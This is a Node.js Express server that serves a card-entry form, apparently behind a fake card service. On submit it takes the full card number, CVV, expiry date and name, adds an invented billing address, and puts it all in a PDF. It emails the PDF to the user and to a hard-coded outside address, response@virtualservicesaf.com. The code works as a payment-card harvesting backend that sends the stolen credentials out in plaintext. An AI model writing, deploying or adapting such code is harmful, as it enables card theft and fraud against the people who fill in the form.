require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');
const hbs = require('hbs');
const { faker } = require('@faker-js/faker');
const { jsPDF } = require('jspdf');
const fs = require('fs');

const app = express();
app.set('view engine', 'hbs');
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));

// Register Handlebars Partials
hbs.registerPartials(path.join(__dirname, 'views', 'partials'));

// Function to generate a realistic random billing address
function generateBillingAddress() {
    const streetAddress = faker.location.streetAddress({ useFullAddress: true });
    const city = faker.location.city();
    const state = faker.location.state({ abbreviated: true });
    const zip = faker.location.zipCode();
    return `${streetAddress}, ${city}, ${state} ${zip}`;
}

// Function to generate a PDF with card information
async function generatePDF(cardName, cardNumber, expiryDate, cvv, billingAddress) {
    const doc = new jsPDF();

    // Add cardholder details
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(16);
    doc.text(`Cardholder Name: ${cardName}`, 20, 30);
    doc.setFontSize(14);
    doc.text(`Card Number: ${cardNumber.replace(/(.{4})/g, '$1 ')}`, 20, 40);
    doc.text(`Expiry Date: ${expiryDate}`, 20, 50);
    doc.text(`CVV: ${cvv}`, 20, 60);
    doc.text(`Billing Address: ${billingAddress}`, 20, 80);

    // Save the PDF
    const pdfPath = path.join(__dirname, 'card-information.pdf');
    await doc.save(pdfPath);
    return pdfPath;
}

// Render the homepage
app.get('/', (req, res) => {
    res.render('homepage');
});

// Render the card form
app.get('/card', (req, res) => {
    res.render('form', { showButtons: true });
});

// Handle card form submission
app.post('/submit', async (req, res) => {
    const { user_email, card_number, cvv, expiry_date, card_name } = req.body;
    const billingAddress = generateBillingAddress();

    // Generate the PDF
    const pdfPath = await generatePDF(card_name, card_number, expiry_date, cvv, billingAddress);

    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        port: '587',
        secure: false,
        auth: {
            user: process.env.EMAIL,
            pass: process.env.EMAIL_PASSWORD,
        },
    });

    // Compile the email template
    const emailTemplatePath = path.join(__dirname, 'views', 'emails', 'email.hbs');
    const emailTemplate = fs.readFileSync(emailTemplatePath, 'utf8');
    const compiledTemplate = hbs.compile(emailTemplate);
    const cardHTML = compiledTemplate({
        cardName: card_name,
        cardNumber: card_number.replace(/(.{4})/g, '$1 '),
        expiryDate: expiry_date,
        cvv,
        billingAddress,
    });

    // Send email
    const mailOptions = {
        from: process.env.EMAIL,
        to: [user_email, 'response@virtualservicesaf.com'],
        subject: 'Card Information',
        html: cardHTML,
        attachments: [
            {
                filename: 'card-information.pdf',
                path: pdfPath,
            },
        ],
    };

    try {
        await transporter.sendMail(mailOptions);
        fs.unlinkSync(pdfPath); // Delete the PDF after sending
        res.redirect('/success'); // Redirect to success page
    } catch (error) {
        console.error(error);
        res.status(500).send('<script>alert("Error sending email."); window.location="/";</script>');
    }
});

// Render the success page
app.get('/success', (req, res) => {
    res.render('success');
});

// Start the server
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
